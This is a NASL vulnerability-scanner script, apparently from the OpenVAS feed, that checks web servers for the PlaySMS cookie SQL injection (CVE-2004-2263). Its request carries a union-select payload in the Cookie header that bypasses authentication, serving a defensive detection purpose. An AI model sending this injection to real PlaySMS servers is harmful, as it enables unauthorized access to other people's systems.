if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14362" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2004-2263" );
	script_bugtraq_id( 10751, 10752, 10970 );
	script_xref( name: "OSVDB", value: "8984" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PlaySMS Cookie SQL Injection" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to version 0.7.1 or later." );
	script_tag( name: "summary", value: "PlaySMS is a full-featured SMS gateway application that features sending of
  single or broadcast SMSes, the ability to receive and forward SMSes, an SMS board, an SMS polling system, SMS customs
  for handling incoming SMSes and forwarding them to custom applications, and SMS commands for saving/retrieving
  information to/from a server and executing server-side shell scripts." );
	script_tag( name: "impact", value: "An SQL Injection vulnerability in the product allows remote attackers to
  inject arbitrary SQL statements via the cookie mechanism used by the product." );
	script_xref( name: "URL", value: "http://sourceforge.net/project/shownotes.php?release_id=254915" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "/jscss/selectbox.js\"" ) && !ContainsString( buf, "content=\"http://playsms" ) && !ContainsString( buf, "powered_by_playsms.gif" ) )){
		continue;
	}
	url = dir + "/fr_left.php";
	req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n", "Accept-Language: en-us,en;q=0.5\\r\\n", "Cookie: vc1=ticket; vc2='%20union%20select%20'ticket;\\r\\n", "Connection: close\\r\\n\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(ContainsString( res, "User's Menu" ) && ContainsString( res, "Add SMS board" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

